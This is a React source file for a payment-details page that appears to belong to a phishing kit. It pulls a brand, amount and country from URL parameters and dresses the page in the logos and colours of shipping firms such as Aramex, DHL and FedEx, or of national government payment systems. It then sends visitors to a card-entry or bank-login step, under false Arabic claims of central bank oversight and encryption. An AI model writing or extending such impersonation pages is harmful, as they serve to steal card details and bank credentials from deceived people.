import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getShippingCompanyDesign } from "@/lib/shippingCompanyDesigns";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry, getCountryByCurrency } from "@/lib/countryCurrencies";
import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import BrandedCarousel from "@/components/BrandedCarousel";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import PageLoader from "@/components/PageLoader";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService } from "@/lib/governmentPaymentServices";
import { getGovernmentLayout } from "@/components/GovernmentLayouts";
import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
import ShippingCompanyHeader from "@/components/ShippingCompanyHeader";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const { data: linkData, isLoading, isError } = useLink(id);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError || searchParams.get('service')) {
      setShowPage(true);
    }
  }, [linkData, isError, searchParams]);

  const serviceKey = searchParams.get('company') || searchParams.get('service') || searchParams.get('s') || linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyDesign = getShippingCompanyDesign(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const shippingInfo = linkData?.payload as any;
  
  const isShippingCompany = ['aramex', 'dhl', 'fedex', 'ups', 'smsa', 'naqel', 'zajil'].includes(serviceKey.toLowerCase());
  
  const amountParam = searchParams.get('amount') || searchParams.get('a');
  const currencyParam = searchParams.get('currency');
  const methodParam = searchParams.get('method') || searchParams.get('pm');
  const countryParam = searchParams.get('country') || searchParams.get('c');
  
  const inferredCountryFromCurrency = currencyParam ? getCountryByCurrency(currencyParam) : null;
  
  const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
  const currencyInfo = getCurrencyByCountry(countryCode);
  
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(countryCode);

  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
  }
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || branding.logo;
  
  // Apply payment gateway visuals for non-government services
  const useGatewayVisuals = !isGovService && shouldUsePaymentGatewayVisuals(serviceKey);
  const gatewayVisuals = useGatewayVisuals ? getNonGovPaymentGatewayVisuals(countryCode, serviceKey) : null;
  
  const primaryColor = isGovService ? govSystem.colors.primary : (gatewayVisuals?.colors.primary || companyDesign.colors.primary || companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (gatewayVisuals?.colors.secondary || companyDesign.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (gatewayVisuals?.colors.surface || companyDesign.colors.surface || companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (gatewayVisuals?.fonts.primaryAr || companyDesign.fonts.primaryAr || companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
  const borderColor = gatewayVisuals?.colors.border || '#E5E7EB';
  const textColor = gatewayVisuals?.colors.text || '#1A1A1A';
  
  const handleProceed = () => {
    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
    
    const queryParams = new URLSearchParams({
      service: serviceKey,
      country: countryCode,
      amount: amount.toString(),
      currency: currencyParam || currencyInfo?.code || 'SAR'
    }).toString();
    
    const nextUrl = paymentMethod === 'bank_login' 
      ? `/pay/${id}/bank-selector?${queryParams}`
      : `/pay/${id}/card?${queryParams}`;
    
    navigate(nextUrl);
  };
  
  if (isGovService) {
    const GovLayout = getGovernmentLayout(countryCode);
    return (
      <>
        <PaymentMetaTags 
          serviceKey={serviceKey}
          serviceName={serviceName}
          title={`تفاصيل الدفع - ${serviceName}`}
          customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
          amount={formattedAmount}
        />
        
        <GovLayout 
          countryCode={countryCode} 
          serviceName={govSystem.nameAr || serviceName}
          amount={formattedAmount}
        >
          <div className="space-y-6">
            {/* Payment Summary */}
            <div 
              className="p-6 rounded-lg border"
              style={{
                background: `${companyDesign.colors.primary}08`,
                borderColor: companyDesign.colors.border,
                borderRadius: companyDesign.borderRadius.md
              }}
            >
              <h3 
                className="font-bold text-lg mb-4 border-b pb-2"
                style={{ 
                  color: companyDesign.colors.text,
                  borderColor: companyDesign.colors.border
                }}
              >
                ملخص الدفع
              </h3>
              
              <div className="space-y-3">
                <div className="flex justify-between items-center text-sm">
                  <span className="opacity-70" style={{ color: companyDesign.colors.text }}>نوع الخدمة</span>
                  <span className="font-semibold" style={{ color: companyDesign.colors.text }}>{serviceName}</span>
                </div>
                
                {shippingInfo?.tracking_number && (
                  <div className="flex justify-between items-center text-sm">
                    <span className="opacity-70" style={{ color: companyDesign.colors.text }}>رقم المرجع</span>
                    <span className="font-mono font-semibold" style={{ color: companyDesign.colors.text }}>{shippingInfo.tracking_number}</span>
                  </div>
                )}
                
                {rawAmount && (
                  <div className="my-2 pt-2 flex justify-between items-center" style={{ borderTop: `2px solid ${companyDesign.colors.border}` }}>
                    <span className="font-bold" style={{ color: companyDesign.colors.text }}>المبلغ الإجمالي</span>
                    <span className="font-bold text-xl" style={{ color: companyDesign.colors.primary }}>{formattedAmount}</span>
                  </div>
                )}
              </div>
            </div>

            {/* Payment Method Selection - Simplified for Gov */ }
            <div className="space-y-3">
              <h3 className="font-bold text-base text-gray-800">طريقة الدفع</h3>
              {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
                <div className="flex items-center gap-3 p-4 border rounded-lg bg-white shadow-sm">
                  <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-blue-600">
                    <Lock className="w-5 h-5" />
                  </div>
                  <div>
                    <p className="font-bold text-sm">حساب بنكي</p>
                    <p className="text-xs text-gray-500">تسجيل دخول آمن</p>
                  </div>
                  <CheckCircle2 className="w-5 h-5 text-green-600 mr-auto" />
                </div>
              ) : (
                <div className="flex items-center gap-3 p-4 border rounded-lg bg-white shadow-sm">
                  <div className="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center text-blue-600">
                    <CreditCard className="w-5 h-5" />
                  </div>
                  <div>
                    <p className="font-bold text-sm">بطاقة مدى / ائتمانية</p>
                    <p className="text-xs text-gray-500">دفع إلكتروني فوري</p>
                  </div>
                  <CheckCircle2 className="w-5 h-5 text-green-600 mr-auto" />
                </div>
              )}
            </div>

            {/* Proceed Button */}
            <Button
              onClick={handleProceed}
              size="lg"
              className="w-full h-12 text-base font-bold shadow-md hover:shadow-lg transition-all"
              style={{
                background: govSystem.gradients.primary,
                borderRadius: govSystem.borderRadius.md,
                color: govSystem.colors.textOnPrimary
              }}
            >
              <span className="ml-2">تأكيد ومتابعة</span>
              <ArrowLeft className="w-5 h-5 mr-2" />
            </Button>
            
            <p className="text-xs text-center text-gray-400">
              جميع العمليات تخضع لرقابة البنك المركزي
            </p>
          </div>
        </GovLayout>
      </>
    );
  }

  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={`تفاصيل الدفع - ${serviceName}`}
        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
        amount={formattedAmount}
      />

      {/* Branded Header */}
      {isShippingCompany ? (
        <ShippingCompanyHeader
          companyKey={serviceKey}
          serviceName={serviceName}
          showSecurityBadge={true}
        />
      ) : (
        <div 
          className="sticky top-0 z-50 w-full shadow-md"
          style={{
            background: gatewayVisuals ? gatewayVisuals.gradients.header : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
            borderBottom: `3px solid ${primaryColor}`,
            boxShadow: gatewayVisuals?.shadows.md || '0 2px 8px rgba(0,0,0,0.1)'
          }}
        >
          <div className="container mx-auto px-3 sm:px-4">
            <div className="flex items-center justify-between h-14 sm:h-16">
              <div className="flex items-center gap-2 sm:gap-3">
                {displayLogo && (
                  <img 
                    src={displayLogo} 
                    alt={serviceName}
                    className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
                  />
                )}
                <div className="text-white">
                  <h2 className="text-base sm:text-lg font-bold">
                    {serviceName}
                  </h2>
                  <p className="text-xs opacity-90 hidden sm:block">
                    الدفع الآمن
                  </p>
                </div>
              </div>
              
              <div className="flex items-center gap-1.5 px-2 sm:px-3 py-1 rounded-full bg-white/20 backdrop-blur-sm">
                <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-white" />
                <span className="text-xs font-medium text-white">آمن</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Company Hero Image or Carousel */}
      {isShippingCompany && companyDesign.headerImage ? (
        <div className="w-full">
          <img
            src={companyDesign.headerImage}
            alt={serviceName}
            className="w-full h-48 sm:h-64 object-cover"
            onError={(e) => e.currentTarget.style.display = 'none'}
          />
        </div>
      ) : (
        <BrandedCarousel 
          serviceKey={serviceKey} 
          className="mb-0"
          countryCode={countryCode}
          isGovService={isGovService}
        />
      )}

      {/* Main Content */}
      <div 
        className="min-h-screen py-6 sm:py-8"
        dir="rtl"
        style={{
          background: isShippingCompany 
            ? `linear-gradient(135deg, ${companyDesign.colors.background}, ${companyDesign.colors.surface})` 
            : `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily
        }}
      >
        <div className="container mx-auto px-3 sm:px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-6">
            <h1 
              className="text-xl sm:text-2xl font-bold mb-2"
              style={{
                color: isShippingCompany ? companyDesign.colors.primary : primaryColor,
                fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily,
                fontWeight: isShippingCompany ? (companyDesign.fonts.weight?.bold || 700) : 700
              }}
            >
              تفاصيل الدفع
            </h1>
            <p 
              className="text-sm"
              style={{
                color: isShippingCompany ? companyDesign.colors.text : '#6B7280',
                opacity: 0.8
              }}
            >
              راجع تفاصيل طلبك قبل المتابعة
            </p>
          </div>

          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: '20px',
              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
            }}
          >
            {/* Shipping Info Display */}
            {shippingInfo && (
              <>
                <div className="px-4 sm:px-6 py-4 bg-white space-y-3">
                  {shippingInfo.tracking_number && (
                    <div className="flex items-center justify-between py-2 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Hash className="w-4 h-4" />
                        <span className="text-sm">رقم الشحنة</span>
                      </div>
                      <span className="font-bold text-sm">{shippingInfo.tracking_number}</span>
                    </div>
                  )}
                  {shippingInfo.package_description && (
                    <div className="flex items-center justify-between py-2 border-b">
                      <div className="flex items-center gap-2 text-gray-600">
                        <Truck className="w-4 h-4" />
                        <span className="text-sm">وصف الطرد</span>
                      </div>
                      <span className="font-semibold text-sm">{shippingInfo.package_description}</span>
                    </div>
                  )}
                </div>
              </>
            )}
          </Card>

          {/* Payment Summary */}
          <Card 
            className="overflow-hidden border-0 mb-4"
            style={{
              borderRadius: gatewayVisuals?.borderRadius.lg || '16px',
              boxShadow: gatewayVisuals?.shadows.lg || '0 4px 20px rgba(0,0,0,0.08)',
              borderTop: `4px solid ${primaryColor}`
            }}
          >
            <div className="px-4 sm:px-6 py-4 bg-white space-y-3">
              <div className="flex justify-between py-2 border-b">
                <span className="text-sm text-gray-600">الخدمة</span>
                <span className="font-bold text-sm">{serviceName}</span>
              </div>
              
              {rawAmount && (
                <div 
                  className="flex justify-between items-center py-3 px-4 rounded-lg"
                  style={{
                    background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
                  }}
                >
                  <span className="text-base font-bold">المبلغ الإجمالي</span>
                  <span className="text-xl sm:text-2xl font-bold" style={{ color: primaryColor }}>
                    {formattedAmount}
                  </span>
                </div>
              )}
            </div>
          </Card>

          {/* Payment Method */}
          <Card 
            className="overflow-hidden border-0 mb-6"
            style={{
              borderRadius: isShippingCompany ? companyDesign.borderRadius.lg : (gatewayVisuals?.borderRadius.lg || '16px'),
              boxShadow: isShippingCompany ? companyDesign.shadows.lg : (gatewayVisuals?.shadows.lg || '0 4px 20px rgba(0,0,0,0.08)'),
              borderTop: `4px solid ${primaryColor}`
            }}
          >
            <div className="px-4 sm:px-6 py-4 bg-white">
              {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <Lock className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">تسجيل دخول البنك 🏦</p>
                    <p className="text-sm text-gray-600">
                      الدفع الآمن عبر حسابك البنكي
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              ) : (
                <div 
                  className="flex items-center gap-4 p-5 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div 
                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
                    style={{
                      background: `${primaryColor}20`
                    }}
                  >
                    <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
                  </div>
                  <div className="flex-1">
                    <p className="font-bold text-base mb-1">الدفع بالبطاقة 💳</p>
                    <p className="text-sm text-gray-600">
                      Visa • Mastercard • Mada
                    </p>
                  </div>
                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
                </div>
              )}
            </div>
          </Card>
      
          {/* Proceed Button */}
          <Button
            onClick={handleProceed}
            size="lg"
            className="w-full text-lg py-6 font-bold"
            style={{
              background: isShippingCompany 
                ? companyDesign.gradients.primary 
                : gatewayVisuals 
                  ? gatewayVisuals.gradients.primary 
                  : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
              color: isShippingCompany ? (companyDesign.colors.textOnPrimary || '#FFFFFF') : '#FFFFFF',
              boxShadow: isShippingCompany 
                ? companyDesign.shadows.md 
                : gatewayVisuals?.shadows.md || `0 8px 24px -8px ${primaryColor}70`,
              borderRadius: isShippingCompany 
                ? companyDesign.borderRadius.md 
                : gatewayVisuals?.borderRadius.md || '12px',
              fontFamily: isShippingCompany ? companyDesign.fonts.primaryAr : fontFamily
            }}
          >
            <span className="ml-2">متابعة للدفع</span>
            <ArrowLeft className="w-5 h-5 mr-2" />
          </Button>
    
          <p className="text-xs text-center text-gray-500 mt-4">
            🔒 جميع المعاملات مشفرة وأمنة
          </p>

          {/* Footer */}
          <div className="mt-6 text-center">
            <div className="flex items-center justify-center gap-3 text-xs text-gray-500 mb-2">
              <div className="flex items-center gap-1">
                <Lock className="w-3 h-3" />
                <span className="text-xs">SSL</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1">
                <ShieldCheck className="w-3 h-3" />
                <span className="text-xs">Verified</span>
              </div>
            </div>
            <p className="text-xs text-gray-400">
              © 2025 {serviceName}
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
